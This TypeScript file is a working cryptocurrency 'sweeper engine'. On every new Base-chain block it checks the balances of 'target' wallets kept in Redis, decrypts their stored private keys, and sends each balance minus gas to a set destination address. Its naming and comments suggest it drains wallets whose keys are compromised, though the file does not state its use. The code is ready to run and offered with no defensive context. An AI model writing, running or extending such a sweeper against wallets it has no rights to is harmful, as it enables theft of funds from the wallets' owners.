import { createPublicClient, createWalletClient, webSocket, http, formatEther } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { base } from 'viem/chains'; // Change this to mainnet, bsc, etc., based on your target
import * as dotenv from 'dotenv';
import { redis } from '../config/db';
import { decryptKey } from './encryption';

dotenv.config();

const WSS_URL = process.env.RPC_WSS_URL;
if (!WSS_URL) throw new Error("Missing RPC_WSS_URL");

// High-speed WebSocket client for listening
const publicClient = createPublicClient({
    chain: base,
    transport: webSocket(WSS_URL)
});

// Fallback HTTP client for broadcasting transactions reliably
const broadcastClient = createWalletClient({
    chain: base,
    transport: http(process.env.RPC_HTTP_URL || WSS_URL.replace('wss://', 'https://'))
});

export const startSweeperEngine = async () => {
    console.log("⚡️ Execution Engine Online: Watching for funds...");

    publicClient.watchBlocks({
        onBlock: async (block) => {
            try {
                // 1. Fetch all active target wallets from Redis instantly
                const keys = await redis.keys('target:*');
                if (keys.length === 0) return;

                // 2. Check balances concurrently for ultra-low latency
                await Promise.all(keys.map(async (redisKey) => {
                    const targetAddress = redisKey.split(':')[1] as `0x${string}`;
                    
                    const balance = await publicClient.getBalance({ address: targetAddress });
                    if (balance === 0n) return; // Wallet is empty

                    // 3. Funds detected! Initiate sweep protocol.
                    const targetData = await redis.hgetall(redisKey);
                    if (!targetData || !targetData.encryptedKey) return;

                    const privateKey = decryptKey(targetData.encryptedKey) as `0x${string}`;
                    const account = privateKeyToAccount(privateKey);
                    const destination = targetData.destination as `0x${string}`;

                    // 4. Calculate Gas & Sweep Amount
                    const gasPrice = await publicClient.getGasPrice();
                    const gasLimit = 21000n; // Standard ETH transfer
                    const txFee = gasPrice * gasLimit;

                    if (balance <= txFee) {
                        console.log(`Insufficient funds to cover gas for ${targetAddress}`);
                        return;
                    }

                    const sweepAmount = balance - txFee;

                    // 5. Broadcast Transaction
                    const txHash = await broadcastClient.sendTransaction({
                        account,
                        to: destination,
                        value: sweepAmount,
                        gas: gasLimit,
                        gasPrice: gasPrice,
                    });

                    console.log(`✅ SWEPT! Sent ${formatEther(sweepAmount)} to ${destination}. TX: ${txHash}`);
                    
                    // Optional: Deactivate wallet after successful sweep to save resources
                    // await redis.del(redisKey); 
                }));
            } catch (error) {
                console.error("[Engine Error] Block processing failed:", error);
            }
        }
    });
};
